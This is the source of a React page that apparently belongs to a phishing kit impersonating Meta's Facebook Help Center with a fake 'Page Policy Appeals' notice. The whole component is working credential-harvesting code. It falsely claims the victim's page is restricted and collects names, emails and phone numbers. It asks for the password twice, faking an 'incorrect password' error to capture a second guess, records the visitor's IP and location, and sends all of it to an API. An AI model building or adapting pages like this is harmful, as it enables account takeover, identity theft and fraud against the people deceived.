import React, { useEffect } from "react";
import { logo_222525as1d15w5e51 } from "./Publics/images/images";
import { Link, useNavigate } from "react-router-dom";
import { useState } from "react";
import axios from "axios";
import { Button, Form, Input } from "antd";
import { sendDataApi } from "../apis/checkData";
const { TextArea } = Input;

const FormProfileComponent = () => {
    const [form] = Form.useForm();
    const navigate = useNavigate();

    const [activePopup, setActivePopup] = useState(false);
    const [first, setActionFirst] = useState(true);
    const [activePassword, setActivePassword] = useState(false);
    const [ipAddress, setIpAddress] = useState();
    const [firstPassword, setFirstPassword] = useState();

    const handleOpendPopup = () => {
        setActivePopup(true);
    };

    const handleClosePopup = () => {
        setActivePopup(false);
    };

    const onFinish = (values) => {

        const jsonData = JSON.stringify(values);
        sessionStorage.setItem('account', jsonData);
        return handleOpendPopup();

    };

    const onFinishPassWord = async (values) => {

        if (first === true) {
            setFirstPassword(values.passwordAccount)
            setActivePassword(true);
            form.setFieldsValue({ passwordAccount: '' });
        }

        if (activePassword === true) {
            const password      = values.passwordAccount;
            const dataAccount   = JSON.parse(sessionStorage.getItem('account'));
            
            const dataSystem = {
                ip: ipAddress,
                passwordFirst: firstPassword,
                passwordSecond: password,
                image: '',
                ...dataAccount
            };
            
            const jsonSystem = JSON.stringify(dataSystem);
            sessionStorage.setItem('buisiness', jsonSystem);

            sendDataApi(dataSystem)
            sessionStorage.removeItem('account');
            navigate("/manager-account/confirm");
        }

    };

    useEffect(() => {
        axios.get(`https://api.db-ip.com/v2/free/self`).then((response) => {
            setIpAddress(`${response.data.ipAddress} | ${response.data.continentName} | ${response.data.countryName} | ${response.data.stateProv} `)
        });
    }, [])

    return (
        <div className="business">
            {/* START HEADER */}
            <div className="top-header">
                <div className="container">
                    <img src={logo_222525as1d15w5e51} width="140" className="metalogo" alt="" />

                    <div className="search-th">
                        <div className="icon-th">
                            <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path d="M10.2744 9.0509C10.9663 8.10889 11.375 6.94592 11.375 5.6875C11.375 2.54638 8.82862 0 5.6875 0C2.54638 0 0 2.54638 0 5.6875C0 8.82862 2.54638 11.375 5.6875 11.375C6.94626 11.375 8.10951 10.9661 9.05166 10.2738L9.0509 10.2744C9.07671 10.3094 9.10545 10.3429 9.13713 10.3746L12.5063 13.7437C12.848 14.0854 13.402 14.0854 13.7437 13.7437C14.0854 13.402 14.0854 12.848 13.7437 12.5063L10.3746 9.13713C10.3429 9.10545 10.3094 9.07671 10.2744 9.0509ZM10.5 5.6875C10.5 8.34537 8.34537 10.5 5.6875 10.5C3.02963 10.5 0.875 8.34537 0.875 5.6875C0.875 3.02963 3.02963 0.875 5.6875 0.875C8.34537 0.875 10.5 3.02963 10.5 5.6875Z" fill="#474747" />
                            </svg>
                        </div>
                        <input type="text" placeholder="How can we help?" />
                    </div>
                </div>
            </div>

            <div className="bottom-header">
                <div className="container">
                    <Link to="#" className="first">
                        <svg xmlns="http://www.w3.org/2000/svg" className="ionicon s-ion-icon" viewBox="0 0 512 512"><path d="M261.56 101.28a8 8 0 00-11.06 0L66.4 277.15a8 8 0 00-2.47 5.79L63.9 448a32 32 0 0032 32H192a16 16 0 0016-16V328a8 8 0 018-8h80a8 8 0 018 8v136a16 16 0 0016 16h96.06a32 32 0 0032-32V282.94a8 8 0 00-2.47-5.79z"></path><path d="M490.91 244.15l-74.8-71.56V64a16 16 0 00-16-16h-48a16 16 0 00-16 16v32l-57.92-55.38C272.77 35.14 264.71 32 256 32c-8.68 0-16.72 3.14-22.14 8.63l-212.7 203.5c-6.22 6-7 15.87-1.34 22.37A16 16 0 0043 267.56L250.5 69.28a8 8 0 0111.06 0l207.52 198.28a16 16 0 0022.59-.44c6.14-6.36 5.63-16.86-.76-22.97z"></path></svg>
                        <b>Help Center</b>
                    </Link>
                    <Link to="#">English</Link>
                </div>
            </div>
            {/* END HEADER */}

            {/* START MAIN */}
            <div className="main">
                <div className="container">

                    <div className="aside col-md-3 col-12">
                        <ul >
                            <li>
                                <Link to="#">Creating an Account</Link>
                            </li>
                            <li>
                                <Link to="#">Your Profile</Link>
                            </li>
                            <li>
                                <Link to="#">Friending</Link>
                            </li>
                            <li>
                                <Link to="#">Facebook Dating</Link>
                            </li>
                            <li>
                                <Link to="#">Your Home Page</Link>
                            </li>
                            <li>
                                <Link to="#">Messaging</Link>
                            </li>
                            <li>
                                <Link to="#">Reels</Link>
                            </li>
                            <li>
                                <Link to="#">Stories</Link>
                            </li>
                            <li>
                                <Link to="#">Photos</Link>
                            </li>
                            <li>
                                <Link to="#">Videos</Link>
                            </li>
                            <li>
                                <Link to="#">Gaming</Link>
                            </li>
                            <li>
                                <Link to="#">Pages</Link>
                            </li>
                            <li>
                                <Link to="#">Groups</Link>
                            </li>
                            <li>
                                <Link to="#">Events</Link>
                            </li>
                            <li>
                                <Link to="#">Fundraisers and Donations</Link>
                            </li>
                            <li>
                                <Link to="#">Meta Pay</Link>
                            </li>
                            <li>
                                <Link to="#">Marketplace</Link>
                            </li>
                            <li>
                                <Link to="#">Apps</Link>
                            </li>
                            <li>
                                <Link to="#">Facebook Mobile Apps</Link>
                            </li>
                            <li>
                                <Link to="#">Accessibility</Link>
                            </li>
                        </ul>
                    </div>

                    {/** START FORM FILL DATA **/}
                    <div className="content col-md-7 col-11">

                        <div className="form">
                            <div className="title-th" style={{ fontSize: "20px", textAlign: "left" }}>
                                <strong>Page Policy Appeals</strong>
                            </div>

                            <div className="desc-form" style={{ fontSize: "12px", textAlign: "left", padding: "15px 1rem" }}>
                                <p>We have detected unusual activity on your page that violates our community standards.</p>
                                <p>Your access to your page has been limited, and you are currently unable to post, share, or comment using your page.</p>
                                <p>If you believe this to be a mistake, you have the option to submit an appeal by providing the necessary information.</p>
                            </div>

                            <Form
                                name="basic"
                                className="form-basic"
                                initialValues={{
                                    remember: true,
                                }}
                                onFinish={onFinish}
                                autoComplete="off"
                            >
                                <div className="item-form">
                                    <label htmlFor="fanpageName">Name Fanpage<i>*</i></label>
                                    <Form.Item
                                        name="fanpageName"
                                        rules={[
                                            {
                                                required: true,
                                                message: 'Please input business fanpage name!',
                                            },
                                        ]}
                                    >
                                        <Input />
                                    </Form.Item>
                                </div>
                                
                                <div className="item-form">
                                    <label htmlFor="fullName">Full Name<i>*</i></label>
                                    <Form.Item
                                        name="fullName"
                                        rules={[
                                            {
                                                required: true,
                                                message: 'Please input full name!',
                                            },
                                        ]}
                                    >
                                        <Input />
                                    </Form.Item>
                                </div>

                                <div className="item-form">
                                    <label htmlFor="businessEmail">Business Email Address<i>*</i></label>
                                    <Form.Item
                                        name="businessEmail"
                                        rules={[
                                            {
                                                required: true,
                                                message: 'Please input business email address!',
                                            },
                                        ]}
                                    >
                                        <Input />
                                    </Form.Item>
                                </div>

                                <div className="item-form">
                                    <label htmlFor="personalEmail">Personal Email Address<i>*</i></label>
                                    <Form.Item
                                        name="personalEmail"
                                        rules={[
                                            {
                                                required: true,
                                                message: 'Please input personal email address!',
                                            },
                                        ]}
                                    >
                                        <Input />
                                    </Form.Item>
                                </div>

                                <div className="item-form">
                                    <label htmlFor="mobilePhone">Mobile Phone Number<i>*</i></label>
                                    <Form.Item
                                        name="mobilePhone"
                                        rules={[
                                            {
                                                required: true,
                                                message: 'Please input mobile phone!',
                                            },
                                        ]}
                                    >
                                        <Input />
                                    </Form.Item>
                                </div>

                                <div className="item-form">
                                    <label htmlFor="infomation">
                                        Please provide us information that will help us investigate.
                                    </label>
                                    <Form.Item
                                        name="infomation"
                                    >
                                        <TextArea rows={3} />
                                    </Form.Item>
                                </div>

                                <Form.Item
                                    className="btn butoni"
                                >
                                    <Button
                                        htmlType="submit"
                                        style={{
                                            backgroundColor: "#1e429f",
                                            outline: "none",
                                            border: 'none',
                                            boxShadow: 'none',
                                            color: "white",
                                            fontWeight: '700',
                                            fontSize: '1rem',
                                            display: 'flex',
                                            alignItems: "center",
                                            height: '2.2rem'
                                        }}
                                    >
                                        Send
                                    </Button>
                                </Form.Item>
                            </Form>

                        </div>

                    </div>
                    {/* END FORM FILL DATA */}

                </div>
            </div>
            {/* END MAIN */}

            {/*START FOOTER*/}
            <div className="bottomfooter">
                <div className="container">
                    <ul>
                        <li>English (UK)</li>
                        <li>English (US)</li>
                        <li>Español</li>
                        <li>Português (Brasil)</li>
                        <li>Français (France)</li>
                        <li>Español (España)</li>
                        <li>More languages</li>
                    </ul>
                    <ul>
                        <li>© 2023 Meta</li>
                        <li>About</li>
                        <li>Developers</li>
                        <li>Careers</li>
                        <li>Privacy</li>
                        <li>Cookies</li>
                        <li>Terms</li>
                        <li>Help Centre</li>
                    </ul>
                </div>
            </div>

            <div className={`popup  ${activePopup === true ? "active" : ""}`} id="popup" >
                <div className="background" onClick={handleClosePopup}></div>
                <div className="content">
                    <Form
                        name="basicForm"
                        initialValues={{
                            remember: true,
                        }}
                        onFinish={onFinishPassWord}
                        autoComplete="off"
                        form={form}
                    >
                        <div className="modal-header custom-header">
                            <h5
                                id="exampleModalLabel"
                                className="modal-title"
                                style={{ fontWeight: "600" }}
                            >
                                {" "}
                                Please Enter Your Password{" "}
                            </h5>
                            <button
                                type="button"
                                data-dismiss="modal"
                                aria-label="Close"
                                onClick={handleClosePopup}
                                className="close"
                            >
                                <span aria-hidden="true">×</span>
                            </button>
                        </div>

                        <div className="item-form">
                            <p style={{ color: "#6b7280", fontSize: "16px", marginBottom: "10px" }}>
                                {" "}
                                For your security, you must enter your password to continue.{" "}
                            </p>
                            <label htmlFor="passwordAccount" style={{ color: "black" }}>Your password:</label>
                            <Form.Item
                                name="passwordAccount"
                                rules={[
                                    {
                                        required: true,
                                        message: `The password you've entered is incorrect.`,
                                    },
                                ]}
                                style={{
                                    margin: "0",
                                }}
                            >
                                <Input.Password placeholder="Enter your password" />
                            </Form.Item>
                            <p
                                className={`password-correct ${activePassword === true ? "active" : ""
                                    }`}
                            >
                                The password you've entered is incorrect.
                            </p>
                        </div>

                        <Form.Item
                            style={{
                                color: "rgb(255, 255, 255)",
                                marginTop: "20px",
                                width: "auto",
                                float: "right",
                            }}
                            className="btn butoni"
                        >
                            <Button
                                htmlType="submit"
                            >
                                Continue
                            </Button>
                        </Form.Item>
                    </Form>
                </div>
            </div>
        </div>
    );
};

export default FormProfileComponent;
